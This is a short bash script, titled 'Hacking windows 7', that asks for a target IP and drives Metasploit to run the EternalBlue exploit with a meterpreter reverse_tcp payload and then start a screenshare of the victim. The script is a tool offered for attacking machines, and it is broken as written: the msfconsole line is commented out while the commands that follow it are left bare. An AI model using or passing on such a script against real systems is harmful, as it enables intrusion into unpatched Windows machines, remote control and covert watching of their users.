#!/bin/bash

clear
figlet "Hacking windows 7"
echo "   ___________________________"
 echo "        HW7 v.1"
echo "_____________________"
echo " "

echo "AUTHOR : SOHAN ND "
echo "TOOL   : HW7 v.1"
echo "MODE   : KALI LINUX" 

sleep 1

echo " "
echo " Enter the target ip: "
read ip

sleep 1

echo " opening msfconsole"

sleep 1

#msfconsole -q -x "
search eternalblue;
use 0;
set rhosts $ip;
set payload windows/x64/meterpreter/reverse_tcp;
run;
screenshare;
"



